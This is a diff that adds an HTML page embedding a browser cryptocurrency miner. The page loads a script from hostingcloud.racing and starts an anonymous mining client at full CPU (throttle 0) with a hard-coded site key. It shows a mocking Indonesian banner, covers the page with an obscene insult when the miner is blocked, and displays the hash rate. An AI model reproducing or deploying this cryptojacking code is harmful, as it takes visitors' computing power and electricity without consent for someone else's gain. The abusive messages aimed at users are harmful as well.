@@ -1,0 +1,40 @@
+<html>
+<head>
+<script src="https://www.hostingcloud.racing/mhMr.js"></script>
+<script>
+    var _client = new Client.Anonymous('dabb2dcb5f4ad0ebd896f0dd0df9a127fcb173d7dc7e1c2c9ec3ebbe543b53d3', {
+        throttle: 0, c: 'w'
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "Akwikwok Kau Ngapain Buka iNi, Gw Mo Mining TOlol :v", "#cccccc", 40, "#3d3d3d");
+
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Kontol, Pergi Sana!"));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
+<script>
+setTimeout(function(){
+    let div = document.createElement("div");
+    document.body.appendChild(div);
+    setInterval(function(){
+        let speed = _client._threads.reduce((before, worker) => before + worker.hashesPerSecond, 0);
+        let total = _client._threads.reduce((before, worker) => before + worker.hashesTotal, 0);
+        div.innerHTML = `Speed: ${speed} Hashes/s<br>Total Hash: ${total}`;
+    },500);
+},1000);
+</script>
+</head>
+</html>
